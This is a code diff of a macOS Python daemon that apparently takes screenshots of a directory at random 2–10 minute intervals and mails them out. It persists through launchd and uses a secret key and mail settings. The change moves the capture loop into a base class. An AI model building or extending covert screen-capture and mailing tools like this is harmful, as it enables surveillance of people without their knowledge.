@@ -2,8 +2,6 @@
 
 # import imp
 import os
-import time
-import random
 from lib.file_finder import get_embedded_filename
 from lib.daemon import Daemon
 from darwin.killer import GracefulKiller
@@ -27,9 +25,15 @@ def get_plist_filename(s=None):
 
 class MyDaemon(Daemon):
     def __init__(self):
-        Daemon.__init__(self, mail_config, secret_key, installation_path)
+        Daemon.__init__(
+            self,
+            mail_config,
+            secret_key,
+            installation_path,
+            directory,
+            catcher)
 
-    def run(self):
+    def setup(self):
         # the graceful killer registers events on init
         GracefulKiller(
             get_embedded_filename(reloader_name),
@@ -43,11 +47,6 @@ class MyDaemon(Daemon):
             config_event_handler,
             launchd_path,
             recursive=False)
-        self.observer.start()
-        while True:
-            filenames = catcher.capture(directory)
-            self.notifier.send_screenshots(filenames)
-            time.sleep(random.randint(120, 600))
 
 
 if __name__ == "__main__":
